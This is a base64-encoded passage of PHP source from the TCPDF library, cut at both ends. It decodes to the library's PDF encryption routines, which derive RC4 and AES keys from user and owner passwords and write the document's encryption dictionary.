gkJcmV0dXJuIEBodG1sX2VudGl0eV9kZWNvZGUoJHRleHRfdG9fY29udmVydCwgRU5UX1FVT1RFUywgJHRoaXMtPmVuY29kaW5nKTsKCX0KCgkvLyBFTkNSWVBUSU9OIE1FVEhPRFMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoKCS8qKgoJICogQ29tcHV0ZSBlbmNyeXB0aW9uIGtleSBkZXBlbmRpbmcgb24gb2JqZWN0IG51bWJlciB3aGVyZSB0aGUgZW5jcnlwdGVkIGRhdGEgaXMgc3RvcmVkLgoJICogVGhpcyBpcyB1c2VkIGZvciBhbGwgc3RyaW5ncyBhbmQgc3RyZWFtcyB3aXRob3V0IGNyeXB0IGZpbHRlciBzcGVjaWZpZXIuCgkgKiBAcGFyYW0gaW50ICRuIG9iamVjdCBudW1iZXIKCSAqIEByZXR1cm4gaW50IG9iamVjdCBrZXkKCSAqIEBwcm90ZWN0ZWQKCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKiBAc2luY2UgMi4wLjAwMCAoMjAwOC0wMS0wMikKCSAqLwoJcHJvdGVjdGVkIGZ1bmN0aW9uIF9vYmplY3RrZXkoJG4pIHsKCQkkb2Jqa2V5ID0gJHRoaXMtPmVuY3J5cHRkYXRhWydrZXknXS5wYWNrKCdWWHh4JywgJG4pOwoJCWlmICgkdGhpcy0+ZW5jcnlwdGRhdGFbJ21vZGUnXSA9PSAyKSB7IC8vIEFFUy0xMjgKCQkJLy8gQUVTIHBhZGRpbmcKCQkJJG9iamtleSAuPSAiXHg3M1x4NDFceDZDXHg1NCI7IC8vIHNBbFQKCQl9CgkJJG9iamtleSA9IHN1YnN0cihUQ1BERl9TVEFUSUM6Ol9tZDVfMTYoJG9iamtleSksIDAsICgoJHRoaXMtPmVuY3J5cHRkYXRhWydMZW5ndGgnXSAvIDgpICsgNSkpOwoJCSRvYmprZXkgPSBzdWJzdHIoJG9iamtleSwgMCwgMTYpOwoJCXJldHVybiAkb2Jqa2V5OwoJfQoKCS8qKgoJICogRW5jcnlwdCB0aGUgaW5wdXQgc3RyaW5nLgoJICogQHBhcmFtIGludCAkbiBvYmplY3QgbnVtYmVyCgkgKiBAcGFyYW0gc3RyaW5nICRzIGRhdGEgc3RyaW5nIHRvIGVuY3J5cHQKCSAqIEByZXR1cm4gc3RyaW5nIGVuY3J5cHRlZCBzdHJpbmcKCSAqIEBwcm90ZWN0ZWQKCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKiBAc2luY2UgNS4wLjAwNSAoMjAxMC0wNS0xMSkKCSAqLwoJcHJvdGVjdGVkIGZ1bmN0aW9uIF9lbmNyeXB0X2RhdGEoJG4sICRzKSB7CgkJaWYgKCEkdGhpcy0+ZW5jcnlwdGVkKSB7CgkJCXJldHVybiAkczsKCQl9CgkJc3dpdGNoICgkdGhpcy0+ZW5jcnlwdGRhdGFbJ21vZGUnXSkgewoJCQljYXNlIDA6ICAgLy8gUkM0LTQwCgkJCWNhc2UgMTogeyAvLyBSQzQtMTI4CgkJCQkkcyA9IFRDUERGX1NUQVRJQzo6X1JDNCgkdGhpcy0+X29iamVjdGtleSgkbiksICRzLCAkdGhpcy0+bGFzdF9lbmNfa2V5LCAkdGhpcy0+bGFzdF9lbmNfa2V5X2MpOwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAyOiB7IC8vIEFFUy0xMjgKCQkJCSRzID0gVENQREZfU1RBVElDOjpfQUVTKCR0aGlzLT5fb2JqZWN0a2V5KCRuKSwgJHMpOwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAzOiB7IC8vIEFFUy0yNTYKCQkJCSRzID0gVENQREZfU1RBVElDOjpfQUVTKCR0aGlzLT5lbmNyeXB0ZGF0YVsna2V5J10sICRzKTsKCQkJCWJyZWFrOwoJCQl9CgkJfQoJCXJldHVybiAkczsKCX0KCgkvKioKCSAqIFB1dCBlbmNyeXB0aW9uIG9uIFBERiBkb2N1bWVudC4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKiBAc2luY2UgMi4wLjAwMCAoMjAwOC0wMS0wMikKCSAqLwoJcHJvdGVjdGVkIGZ1bmN0aW9uIF9wdXRlbmNyeXB0aW9uKCkgewoJCWlmICghJHRoaXMtPmVuY3J5cHRlZCkgewoJCQlyZXR1cm47CgkJfQoJCSR0aGlzLT5lbmNyeXB0ZGF0YVsnb2JqaWQnXSA9ICR0aGlzLT5fbmV3b2JqKCk7CgkJJG91dCA9ICc8PCc7CgkJaWYgKCFpc3NldCgkdGhpcy0+ZW5jcnlwdGRhdGFbJ0ZpbHRlciddKSBPUiBlbXB0eSgkdGhpcy0+ZW5jcnlwdGRhdGFbJ0ZpbHRlciddKSkgewoJCQkkdGhpcy0+ZW5jcnlwdGRhdGFbJ0ZpbHRlciddID0gJ1N0YW5kYXJkJzsKCQl9CgkJJG91dCAuPSAnIC9GaWx0ZXIgLycuJHRoaXMtPmVuY3J5cHRkYXRhWydGaWx0ZXInXTsKCQlpZiAoaXNzZXQoJHRoaXMtPmVuY3J5cHRkYXRhWydTdWJGaWx0ZXInXSkgQU5EICFlbXB0eSgkdGhpcy0+ZW5jcnlwdGRhdGFbJ1N1YkZpbHRlciddKSkgewoJCQkkb3V0IC49ICcgL1N1YkZpbHRlciAvJy4kdGhpcy0+ZW5jcnlwdGRhdGFbJ1N1YkZpbHRlciddOwoJCX0KCQlpZiAoIWlzc2V0KCR0aGlzLT5lbmNyeXB0ZGF0YVsnViddKSBPUiBlbXB0eSgkdGhpcy0+ZW5jcnlwdGRhdGFbJ1YnXSkpIHsKCQkJJHRoaXMtPmVuY3J5cHRkYXRhWydWJ10gPSAxOwoJCX0KCQkvLyBWIGlzIGEgY29kZSBzcGVjaWZ5aW5nIHRoZSBhbGdvcml0aG0gdG8gYmUgdXNlZCBpbiBlbmNyeXB0aW5nIGFuZCBkZWNyeXB0aW5nIHRoZSBkb2N1bWVudAoJCSRvdXQgLj0gJyAvViAnLiR0aGlzLT5lbmNyeXB0ZGF0YVsnViddOwoJCWlmIChpc3NldCgkdGhpcy0+ZW5jcnlwdGRhdGFbJ0xlbmd0aCddKSBBTkQgIWVtcHR5KCR0aGlzLT5lbmNyeXB0ZGF0YVsnTGVuZ3RoJ10pKSB7CgkJCS8vIFRoZSBsZW5ndGggb2YgdGhlIGVuY3J5cHRpb24ga2V5LCBpbiBiaXRzLiBUaGUgdmFsdWUgc2hhbGwgYmUgYSBtdWx0aXBsZSBvZiA4LCBpbiB0aGUgcmFuZ2UgNDAgdG8gMjU2CgkJCSRvdXQgLj0gJyAvTGVuZ3RoICcuJHRoaXMtPmVuY3J5cHRkYXRhWydMZW5ndGgnXTsKCQl9IGVsc2UgewoJCQkkb3V0IC49ICcgL0xlbmd0aCA0MCc7CgkJfQoJCWlmICgkdGhpcy0+ZW5jcnlwdGRhdGFbJ1YnXSA+PSA0KSB7CgkJCWlmICghaXNzZXQoJHRoaXMtPmVuY3J5cHRkYXRhWydTdG1GJ10pIE9SIGVtcHR5KCR0aGlzLT5lbmNyeXB0ZGF0YVsnU3RtRiddKSkgewoJCQkJJHRoaXMtPmVuY3J5cHRkYXRhWydTdG1GJ10gPSAnSWRlbnRpdHknOwoJCQl9CgkJCWlmICghaXNzZXQoJHRoaXMtPmVuY3J5cHRkYXRhWydTdHJGJ10pIE9SIGVtcHR5KCR0aGlzLT5lbmNyeXB0ZGF0YVsnU3RyRiddKSkgewoJCQkJLy8gVGhlIG5hbWUgb2YgdGhlIGNyeXB0IGZpbHRlciB0aGF0IHNoYWxsIGJlIHVzZWQgd2hlbiBkZWNyeXB0aW5nIGFsbCBzdHJpbmdzIGluIHRoZSBkb2N1bWVudC4KCQkJCSR0aGlzLT5lbmNyeXB0ZGF0YVsnU3RyRiddID0gJ0lkZW50aXR5JzsKCQkJfQoJCQkvLyBBIGRpY3Rpb25hcnkgd2hvc2Uga2V5cyBzaGFsbCBiZSBjcnlwdCBmaWx0ZXIgbmFtZXMgYW5kIHdob3NlIHZhbHVlcyBzaGFsbCBiZSB0aGUgY29ycmVzcG9uZGluZyBjcnlwdCBmaWx0ZXIgZGljdGlvbmFyaWVzLgoJCQlpZiAoaXNzZXQoJHRoaXMtPmVuY3J5cHRkYXRhWydDRiddKSBBTkQgIWVtcHR5KCR0aGlzLT5lbmNyeXB0ZGF0YVsnQ0YnXSkpIHsKCQkJCSRvdXQgLj0gJyAvQ0YgPDwnOwoJCQkJJG91dCAuPSAnIC8nLiR0aGlzLT5lbmNyeXB0ZGF0YVsnU3RtRiddLicgPDwnOwoJCQkJJG91dCAuPSAnIC9UeXBlIC9DcnlwdEZpbHRlcic7CgkJCQlpZiAoaXNzZXQoJHRoaXMtPmVuY3J5cHRkYXRhWydDRiddWydDRk0nXSkgQU5EICFlbXB0eSgkdGhpcy0+ZW5jcnlwdGRhdGFbJ0NGJ11bJ0NGTSddKSkgewoJCQkJCS8vIFRoZSBtZXRob2QgdXNlZAoJCQkJCSRvdXQgLj0gJyAvQ0ZNIC8nLiR0aGlzLT5lbmNyeXB0ZGF0YVsnQ0YnXVsnQ0ZNJ107CgkJCQkJaWYgKCR0aGlzLT5lbmNyeXB0ZGF0YVsncHVia2V5J10pIHsKCQkJCQkJJG91dCAuPSAnIC9SZWNpcGllbnRzIFsnOwoJCQkJCQlmb3JlYWNoICgkdGhpcy0+ZW5jcnlwdGRhdGFbJ1JlY2lwaWVudHMnXSBhcyAkcmVjKSB7CgkJCQkJCQkkb3V0IC49ICcgPCcuJHJlYy4nPic7CgkJCQkJCX0KCQkJCQkJJG91dCAuPSAnIF0nOwoJCQkJCQlpZiAoaXNzZXQoJHRoaXMtPmVuY3J5cHRkYXRhWydDRiddWydFbmNyeXB0TWV0YWRhdGEnXSkgQU5EICghJHRoaXMtPmVuY3J5cHRkYXRhWydDRiddWydFbmNyeXB0TWV0YWRhdGEnXSkpIHsKCQkJCQkJCSRvdXQgLj0gJyAvRW5jcnlwdE1ldGFkYXRhIGZhbHNlJzsKCQkJCQkJfSBlbHNlIHsKCQkJCQkJCSRvdXQgLj0gJyAvRW5jcnlwdE1ldGFkYXRhIHRydWUnOwoJCQkJCQl9CgkJCQkJfQoJCQkJfSBlbHNlIHsKCQkJCQkkb3V0IC49ICcgL0NGTSAvTm9uZSc7CgkJCQl9CgkJCQlpZiAoaXNzZXQoJHRoaXMtPmVuY3J5cHRkYXRhWydDRiddWydBdXRoRXZlbnQnXSkgQU5EICFlbXB0eSgkdGhpcy0+ZW5jcnlwdGRhdGFbJ0NGJ11bJ0F1dGhFdmVudCddKSkgewoJCQkJCS8vIFRoZSBldmVudCB0byBiZSB1c2VkIHRvIHRyaWdnZXIgdGhlIGF1dGhvcml6YXRpb24gdGhhdCBpcyByZXF1aXJlZCB0byBhY2Nlc3MgZW5jcnlwdGlvbiBrZXlzIHVzZWQgYnkgdGhpcyBmaWx0ZXIuCgkJCQkJJG91dCAuPSAnIC9BdXRoRXZlbnQgLycuJHRoaXMtPmVuY3J5cHRkYXRhWydDRiddWydBdXRoRXZlbnQnXTsKCQkJCX0gZWxzZSB7CgkJCQkJJG91dCAuPSAnIC9BdXRoRXZlbnQgL0RvY09wZW4nOwoJCQkJfQoJCQkJaWYgKGlzc2V0KCR0aGlzLT5lbmNyeXB0ZGF0YVsnQ0YnXVsnTGVuZ3RoJ10pIEFORCAhZW1wdHkoJHRoaXMtPmVuY3J5cHRkYXRhWydDRiddWydMZW5ndGgnXSkpIHsKCQkJCQkvLyBUaGUgYml0IGxlbmd0aCBvZiB0aGUgZW5jcnlwdGlvbiBrZXkuCgkJCQkJJG91dCAuPSAnIC9MZW5ndGggJy4kdGhpcy0+ZW5jcnlwdGRhdGFbJ0NGJ11bJ0xlbmd0aCddOwoJCQkJfQoJCQkJJG91dCAuPSAnID4+ID4+JzsKCQkJfQoJCQkvLyBUaGUgbmFtZSBvZiB0aGUgY3J5cHQgZmlsdGVyIHRoYXQgc2hhbGwgYmUgdXNlZCBieSBkZWZhdWx0IHdoZW4gZGVjcnlwdGluZyBzdHJlYW1zLgoJCQkkb3V0IC49ICcgL1N0bUYgLycuJHRoaXMtPmVuY3J5cHRkYXRhWydTdG1GJ107CgkJCS8vIFRoZSBuYW1lIG9mIHRoZSBjcnlwdCBmaWx0ZXIgdGhhdCBzaGFsbCBiZSB1c2VkIHdoZW4gZGVjcnlwdGluZyBhbGwgc3RyaW5ncyBpbiB0aGUgZG9jdW1lbnQuCgkJCSRvdXQgLj0gJyAvU3RyRiAvJy4kdGhpcy0+ZW5jcnlwdGRhdGFbJ1N0ckYnXTsKCQkJaWYgKGlzc2V0KCR0aGlzLT5lbmNyeXB0ZGF0YVsnRUZGJ10pIEFORCAhZW1wdHkoJHRoaXMtPmVuY3J5cHRkYXRhWydFRkYnXSkpIHsKCQkJCS8vIFRoZSBuYW1lIG9mIHRoZSBjcnlwdCBmaWx0ZXIgdGhhdCBzaGFsbCBiZSB1c2VkIHdoZW4gZW5jcnlwdGluZyBlbWJlZGRlZCBmaWxlIHN0cmVhbXMgdGhhdCBkbyBub3QgaGF2ZSB0aGVpciBvd24gY3J5cHQgZmlsdGVyIHNwZWNpZmllci4KCQkJCSRvdXQgLj0gJyAvRUZGIC8nLiR0aGlzLT5lbmNyeXB0ZGF0YVsnJ107CgkJCX0KCQl9CgkJLy8gQWRkaXRpb25hbCBlbmNyeXB0aW9uIGRpY3Rpb25hcnkgZW50cmllcyBmb3IgdGhlIHN0YW5kYXJkIHNlY3VyaXR5IGhhbmRsZXIKCQlpZiAoJHRoaXMtPmVuY3J5cHRkYXRhWydwdWJrZXknXSkgewoJCQlpZiAoKCR0aGlzLT5lbmNyeXB0ZGF0YVsnViddIDwgNCkgQU5EIGlzc2V0KCR0aGlzLT5lbmNyeXB0ZGF0YVsnUmVjaXBpZW50cyddKSBBTkQgIWVtcHR5KCR0aGlzLT5lbmNyeXB0ZGF0YVsnUmVjaXBpZW50cyddKSkgewoJCQkJJG91dCAuPSAnIC9SZWNpcGllbnRzIFsnOwoJCQkJZm9yZWFjaCAoJHRoaXMtPmVuY3J5cHRkYXRhWydSZWNpcGllbnRzJ10gYXMgJHJlYykgewoJCQkJCSRvdXQgLj0gJyA8Jy4kcmVjLic+JzsKCQkJCX0KCQkJCSRvdXQgLj0gJyBdJzsKCQkJfQoJCX0gZWxzZSB7CgkJCSRvdXQgLj0gJyAvUic7CgkJCWlmICgkdGhpcy0+ZW5jcnlwdGRhdGFbJ1YnXSA9PSA1KSB7IC8vIEFFUy0yNTYKCQkJCSRvdXQgLj0gJyA1JzsKCQkJCSRvdXQgLj0gJyAvT0UgKCcuVENQREZfU1RBVElDOjpfZXNjYXBlKCR0aGlzLT5lbmNyeXB0ZGF0YVsnT0UnXSkuJyknOwoJCQkJJG91dCAuPSAnIC9VRSAoJy5UQ1BERl9TVEFUSUM6Ol9lc2NhcGUoJHRoaXMtPmVuY3J5cHRkYXRhWydVRSddKS4nKSc7CgkJCQkkb3V0IC49ICcgL1Blcm1zICgnLlRDUERGX1NUQVRJQzo6X2VzY2FwZSgkdGhpcy0+ZW5jcnlwdGRhdGFbJ3Blcm1zJ10pLicpJzsKCQkJfSBlbHNlaWYgKCR0aGlzLT5lbmNyeXB0ZGF0YVsnViddID09IDQpIHsgLy8gQUVTLTEyOAoJCQkJJG91dCAuPSAnIDQnOwoJCQl9IGVsc2VpZiAoJHRoaXMtPmVuY3J5cHRkYXRhWydWJ10gPCAyKSB7IC8vIFJDLTQwCgkJCQkkb3V0IC49ICcgMic7CgkJCX0gZWxzZSB7IC8vIFJDLTEyOAoJCQkJJG91dCAuPSAnIDMnOwoJCQl9CgkJCSRvdXQgLj0gJyAvTyAoJy5UQ1BERl9TVEFUSUM6Ol9lc2NhcGUoJHRoaXMtPmVuY3J5cHRkYXRhWydPJ10pLicpJzsKCQkJJG91dCAuPSAnIC9VICgnLlRDUERGX1NUQVRJQzo6X2VzY2FwZSgkdGhpcy0+ZW5jcnlwdGRhdGFbJ1UnXSkuJyknOwoJCQkkb3V0IC49ICcgL1AgJy4kdGhpcy0+ZW5jcnlwdGRhdGFbJ1AnXTsKCQkJaWYgKGlzc2V0KCR0aGlzLT5lbmNyeXB0ZGF0YVsnRW5jcnlwdE1ldGFkYXRhJ10pIEFORCAoISR0aGlzLT5lbmNyeXB0ZGF0YVsnRW5jcnlwdE1ldGFkYXRhJ10pKSB7CgkJCQkkb3V0IC49ICcgL0VuY3J5cHRNZXRhZGF0YSBmYWxzZSc7CgkJCX0gZWxzZSB7CgkJCQkkb3V0IC49ICcgL0VuY3J5cHRNZXRhZGF0YSB0cnVlJzsKCQkJfQoJCX0KCQkkb3V0IC49ICcgPj4nOwoJCSRvdXQgLj0gIlxuIi4nZW5kb2JqJzsKCQkkdGhpcy0+X291dCgkb3V0KTsKCX0KCgkvKioKCSAqIENvbXB1dGUgVSB2YWx1ZSAodXNlZCBmb3IgZW5jcnlwdGlvbikKCSAqIEByZXR1cm4gc3RyaW5nIFUgdmFsdWUKCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSAyLjAuMDAwICgyMDA4LTAxLTAyKQoJICogQGF1dGhvciBOaWNvbGEgQXN1bmkKCSAqLwoJcHJvdGVjdGVkIGZ1bmN0aW9uIF9VdmFsdWUoKSB7CgkJaWYgKCR0aGlzLT5lbmNyeXB0ZGF0YVsnbW9kZSddID09IDApIHsgLy8gUkM0LTQwCgkJCXJldHVybiBUQ1BERl9TVEFUSUM6Ol9SQzQoJHRoaXMtPmVuY3J5cHRkYXRhWydrZXknXSwgVENQREZfU1RBVElDOjokZW5jX3BhZGRpbmcsICR0aGlzLT5sYXN0X2VuY19rZXksICR0aGlzLT5sYXN0X2VuY19rZXlfYyk7CgkJfSBlbHNlaWYgKCR0aGlzLT5lbmNyeXB0ZGF0YVsnbW9kZSddIDwgMykgeyAvLyBSQzQtMTI4LCBBRVMtMTI4CgkJCSR0bXAgPSBUQ1BERl9TVEFUSUM6Ol9tZDVfMTYoVENQREZfU1RBVElDOjokZW5jX3BhZGRpbmcuJHRoaXMtPmVuY3J5cHRkYXRhWydmaWxlaWQnXSk7CgkJCSRlbmMgPSBUQ1BERl9TVEFUSUM6Ol9SQzQoJHRoaXMtPmVuY3J5cHRkYXRhWydrZXknXSwgJHRtcCwgJHRoaXMtPmxhc3RfZW5jX2tleSwgJHRoaXMtPmxhc3RfZW5jX2tleV9jKTsKCQkJJGxlbiA9IHN0cmxlbigkdG1wKTsKCQkJZm9yICgkaSA9IDE7ICRpIDw9IDE5OyArKyRpKSB7CgkJCQkkZWsgPSAnJzsKCQkJCWZvciAoJGogPSAwOyAkaiA8ICRsZW47ICsrJGopIHsKCQkJCQkkZWsgLj0gY2hyKG9yZCgkdGhpcy0+ZW5jcnlwdGRhdGFbJ2tleSddWyRqXSkgXiAkaSk7CgkJCQl9CgkJCQkkZW5jID0gVENQREZfU1RBVElDOjpfUkM0KCRlaywgJGVuYywgJHRoaXMtPmxhc3RfZW5jX2tleSwgJHRoaXMtPmxhc3RfZW5jX2tleV9jKTsKCQkJfQoJCQkkZW5jIC49IHN0cl9yZXBlYXQoIlx4MDAiLCAxNik7CgkJCXJldHVybiBzdWJzdHIoJGVuYywgMCwgMzIpOwoJCX0gZWxzZWlmICgkdGhpcy0+ZW5jcnlwdGRhdGFbJ21vZGUnXSA9PSAzKSB7IC8vIEFFUy0yNTYKCQkJJHNlZWQgPSBUQ1BERl9TVEFUSUM6Ol9tZDVfMTYoVENQREZfU1RBVElDOjpnZXRSYW5kb21TZWVkKCkpOwoJCQkvLyBVc2VyIFZhbGlkYXRpb24gU2FsdAoJCQkkdGhpcy0+ZW5jcnlwdGRhdGFbJ1VWUyddID0gc3Vic3RyKCRzZWVkLCAwLCA4KTsKCQkJLy8gVXNlciBLZXkgU2FsdAoJCQkkdGhpcy0+ZW5jcnlwdGRhdGFbJ1VLUyddID0gc3Vic3RyKCRzZWVkLCA4LCAxNik7CgkJCXJldHVybiBoYXNoKCdzaGEyNTYnLCAkdGhpcy0+ZW5jcnlwdGRhdGFbJ3VzZXJfcGFzc3dvcmQnXS4kdGhpcy0+ZW5jcnlwdGRhdGFbJ1VWUyddLCB0cnVlKS4kdGhpcy0+ZW5jcnlwdGRhdGFbJ1VWUyddLiR0aGlzLT5lbmNyeXB0ZGF0YVsnVUtTJ107CgkJfQoJfQoKCS8qKgoJICogQ29tcHV0ZSBVRSB2YWx1ZSAodXNlZCBmb3IgZW5jcnlwdGlvbikKCSAqIEByZXR1cm4gc3RyaW5nIFVFIHZhbHVlCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNS45LjAwNiAoMjAxMC0xMC0xOSkKCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBfVUV2YWx1ZSgpIHsKCQkkaGFzaGtleSA9IGhhc2goJ3NoYTI1NicsICR0aGlzLT5lbmNyeXB0ZGF0YVsndXNlcl9wYXNzd29yZCddLiR0aGlzLT5lbmNyeXB0ZGF0YVsnVUtTJ10sIHRydWUpOwoJCXJldHVybiBUQ1BERl9TVEFUSUM6Ol9BRVNub3BhZCgkaGFzaGtleSwgJHRoaXMtPmVuY3J5cHRkYXRhWydrZXknXSk7Cgl9CgoJLyoqCgkgKiBDb21wdXRlIE8gdmFsdWUgKHVzZWQgZm9yIGVuY3J5cHRpb24pCgkgKiBAcmV0dXJuIHN0cmluZyBPIHZhbHVlCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgMi4wLjAwMCAoMjAwOC0wMS0wMikKCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBfT3ZhbHVlKCkgewoJCWlmICgkdGhpcy0+ZW5jcnlwdGRhdGFbJ21vZGUnXSA8IDMpIHsgLy8gUkM0LTQwLCBSQzQtMTI4LCBBRVMtMTI4CgkJCSR0bXAgPSBUQ1BERl9TVEFUSUM6Ol9tZDVfMTYoJHRoaXMtPmVuY3J5cHRkYXRhWydvd25lcl9wYXNzd29yZCddKTsKCQkJaWYgKCR0aGlzLT5lbmNyeXB0ZGF0YVsnbW9kZSddID4gMCkgewoJCQkJZm9yICgkaSA9IDA7ICRpIDwgNTA7ICsrJGkpIHsKCQkJCQkkdG1wID0gVENQREZfU1RBVElDOjpfbWQ1XzE2KCR0bXApOwoJCQkJfQoJCQl9CgkJCSRvd25lcl9rZXkgPSBzdWJzdHIoJHRtcCwgMCwgKCR0aGlzLT5lbmNyeXB0ZGF0YVsnTGVuZ3RoJ10gLyA4KSk7CgkJCSRlbmMgPSBUQ1BERl9TVEFUSUM6Ol9SQzQoJG93bmVyX2tleSwgJHRoaXMtPmVuY3J5cHRkYXRhWyd1c2VyX3Bhc3N3b3JkJ10sICR0aGlzLT5sYXN0X2VuY19rZXksICR0aGlzLT5sYXN0X2VuY19rZXlfYyk7CgkJCWlmICgkdGhpcy0+ZW5jcnlwdGRhdGFbJ21vZGUnXSA+IDApIHsKCQkJCSRsZW4gPSBzdHJsZW4oJG93bmVyX2tleSk7CgkJCQlmb3IgKCRpID0gMTsgJGkgPD0gMTk7ICsrJGkpIHsKCQkJCQkkZWsgPSAnJzsKCQkJCQlmb3IgKCRqID0gMDsgJGogPCAkbGVuOyArKyRqKSB7CgkJCQkJCSRlayAuPSBjaHIob3JkKCRvd25lcl9rZXlbJGpdKSBeICRpKTsKCQkJCQl9CgkJCQkJJGVuYyA9IFRDUERGX1NUQVRJQzo6X1JDNCgkZWssICRlbmMsICR0aGlzLT5sYXN0X2VuY19rZXksICR0aGlzLT5sYXN0X2VuY19rZXlfYyk7CgkJCQl9CgkJCX0KCQkJcmV0dXJuICRlbmM7CgkJfSBlbHNlaWYgKCR0aGlzLT5lbmNyeXB0ZGF0YVsnbW9kZSddID09IDMpIHsgLy8gQUVTLTI1NgoJCQkkc2VlZCA9IFRDUERGX1NUQVRJQzo6X21kNV8xNihUQ1BERl9TVEFUSUM6OmdldFJhbmRvbVNlZWQoKSk7CgkJCS8vIE93bmVyIFZhbGlkYXRpb24gU2FsdAoJCQkkdGhpcy0+ZW5jcnlwdGRhdGFbJ09WUyddID0gc3Vic3RyKCRzZWVkLCAwLCA4KTsKCQkJLy8gT3duZXIgS2V5IFNhbHQKCQkJJHRoaXMtPmVuY3J5cHRkYXRhWydPS1MnXSA9IHN1YnN0cigkc2VlZCwgOCwgMTYpOwoJCQlyZXR1cm4gaGFzaCgnc2hhMjU2JywgJHRoaXMtPmVuY3J5cHRkYXRhWydvd25lcl9wYXNzd29yZCddLiR0aGlzLT5lbmNyeXB0ZGF0YVsnT1ZTJ10uJHRoaXMtPmVuY3J5cHRkYXRhWydVJ10sIHRydWUpLiR0aGlzLT5lbmNyeXB0ZGF0YVsnT1ZTJ10uJHRoaXMtPmVuY3J5cHRkYXRhWydPS1MnXTsKCQl9Cgl9CgoJLyoqCgkgKiBDb21wdXRlIE9FIHZhbHVlICh1c2VkIGZvciBlbmNyeXB0aW9uKQoJICogQHJldHVybiBzdHJpbmcgT0UgdmFsdWUKCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA1LjkuMDA2ICgyMDEwLTEwLTE5KQoJICogQGF1dGhvciBOaWNvbGEgQXN1bmkKCSAqLwoJcHJvdGVjdGVkIGZ1bmN0aW9uIF9PRXZhbHVlKCkgewoJCSRoYXNoa2V5ID0gaGFzaCgnc2hhMjU2JywgJHRoaXMtPmVuY3J5cHRkYXRhWydvd25lcl9wYXNzd29yZCddLiR0aGlzLT5lbmNyeXB0ZGF0YVsnT0tTJ10uJHRoaXMtPmVuY3J5cHRkYXRhWydVJ10sIHRydWUpOwoJCXJldHVybiBUQ1BERl9TVEFUSUM6Ol9BRVNub3BhZCgkaGFzaGtleSwgJHRoaXMtPmVuY3J5cHRkYXRhWydrZXknXSk7Cgl9CgoJLyoqCgkgKiBDb252ZXJ0IHBhc3N3b3JkIGZvciBBRVMtMjU2IGVuY3J5cHRpb24gbW9kZQoJICogQHBhcmFtIHN0cmluZyAkcGFzc3dvcmQgcGFzc3dvcmQKCSAqIEByZXR1cm4gc3RyaW5nIHBhc3N3b3JkCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNS45LjAwNiAoMjAxMC0xMC0xOSkKCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBfZml4QUVTMjU2UGFzc3dvcmQoJHBhc3N3b3JkKSB7CgkJJHBzdyA9ICcnOyAvLyBwYXNzd29yZCB0byBiZSByZXR1cm5lZAoJCSRwc3dfYXJyYXkgPSBUQ1BERl9GT05UUzo6dXRmOEJpZGkoVENQREZfRk9OVFM6OlVURjhTdHJpbmdUb0FycmF5KCRwYXNzd29yZCwgJHRoaXMtPmlzdW5pY29kZSwgJHRoaXMtPkN1cnJlbnRGb250KSwgJHBhc3N3b3JkLCAkdGhpcy0+cnRsLCAkdGhpcy0+aXN1bmljb2RlLCAkdGhpcy0+Q3VycmVudEZvbnQpOwoJCWZvcmVhY2ggKCRwc3dfYXJyYXkgYXMgJGMpIHsKCQkJJHBzdyAuPSBUQ1BERl9GT05UUzo6dW5pY2hyKCRjLCAkdGhpcy0+aXN1bmljb2RlKTsKCQl9CgkJcmV0dXJuIHN1YnN0cigkcHN3LCAwLCAxMjcpOwoJfQoKCS8qKgoJICogQ29tcHV0ZSBlbmNyeXB0aW9uIGtleQoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDIuMC4wMDAgKDIwMDgtMDEtMDIpCgkgKiBAYXV0aG9yIE5pY29sYSBBc3VuaQoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gX2dlbmVyYXRlZW5jcnlwdGlvbmtleSgpIHsKCQkka2V5Ynl0ZWxlbiA9ICgkdGhpcy0+ZW5jcnlwdGRhdGFbJ0xlbmd0aCddIC8gOCk7CgkJaWYgKCEkdGhpcy0+ZW5jcnlwdGRhdGFbJ3B1YmtleSddKSB7IC8vIHN0YW5kYXJkIG1vZGUKCQkJaWYgKCR0aGlzLT5lbmNyeXB0ZGF0YVsnbW9kZSddID09IDMpIHsgLy8gQUVTLTI1NgoJCQkJLy8gZ2VuZXJhdGUgMjU2IGJpdCByYW5kb20ga2V5CgkJCQkkdGhpcy0+ZW5jcnlwdGRhdGFbJ2tleSddID0gc3Vic3RyKGhhc2goJ3NoYTI1NicsIFRDUERGX1NUQVRJQzo6Z2V0UmFuZG9tU2VlZCgpLCB0cnVlKSwgMCwgJGtleWJ5dGVsZW4pOwoJCQkJLy8gdHJ1bmNhdGUgcGFzc3dvcmRzCgkJCQkkdGhpcy0+ZW5jcnlwdGRhdGFbJ3VzZXJfcGFzc3dvcmQnXSA9ICR0aGlzLT5fZml4QUVTMjU2UGFzc3dvcmQoJHRoaXMtPmVuY3J5cHRkYXRhWyd1c2VyX3Bhc3N3b3JkJ10pOwoJCQkJJHRoaXMtPmVuY3J5cHRkYXRhWydvd25lcl9wYXNzd29yZCddID0gJHRoaXMtPl9maXhBRVMyNTZQYXNzd29yZCgkdGhpcy0+ZW5jcnlwdGRhdGFbJ293bmVyX3Bhc3N3b3JkJ10pOwoJCQkJLy8gQ29tcHV0ZSBVIHZhbHVlCgkJCQkkdGhpcy0+ZW5jcnlwdGRhdGFbJ1UnXSA9ICR0aGlzLT5fVXZhbHVlKCk7CgkJCQkvLyBDb21wdXRlIFVFIHZhbHVlCgkJCQkkdGhpcy0+ZW5jcnlwdGRhdGFbJ1VFJ10gPSAkdGhpcy0+X1V